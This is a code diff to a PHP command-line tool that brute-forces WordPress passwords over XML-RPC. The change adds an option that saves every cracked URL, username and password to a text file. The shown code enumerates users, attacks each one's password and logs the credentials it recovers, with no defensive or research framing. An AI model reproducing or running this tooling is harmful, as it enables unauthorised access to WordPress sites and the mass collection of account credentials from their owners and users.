@@ -70,6 +70,12 @@ class Main extends Command
                InputOption::VALUE_REQUIRED,
                'XMLRPC URI (/xmlrpc.php as default)'
             )
+            ->addOption(
+               'output',
+               null,
+               InputOption::VALUE_REQUIRED,
+               'Save the obtained credentials to a txt file'
+            )
         ;
     }
 
@@ -84,6 +90,8 @@ class Main extends Command
         $notest = $input->getOption('no-test');
         $max_enum = $input->getOption('max-enum');
         $uri = $input->getOption('uri');
+        $output_path = $input->getOption('output');
+        $output_data = '';
 
         $bruteforcer = new WPBruteforcer();
 
@@ -142,7 +150,7 @@ class Main extends Command
                 }
                 $output->writeln('<info> [+] XMLRPC up and running!</info>');
             }
-            
+
             // Usernames
             $users = [];
             if (!$noenum) {
@@ -165,10 +173,17 @@ class Main extends Command
                 $output->writeln(' [+] Bruteforcing user <comment>' . $user . '</comment>');
                 if ($password = $bruteforcer->bruteforce($user)) {
                     $output->writeln('<info> [!] Password found!</info> <comment>' . $password . '</comment>');
+                    $output_data .= $url . ' | ' . $user . ' | ' . $password . PHP_EOL;
                 } else {
                     $output->writeln('<error> [!] Password not found</error>');
                 }
             }
+        }
+
+        if ($output_path) {
+            file_put_contents($output_path, $output_data);
+            $output->writeln('');
+            $output->writeln(' [+] Credentials saved in <comment>' . $output_path . '</comment>');
         }
     }
 }
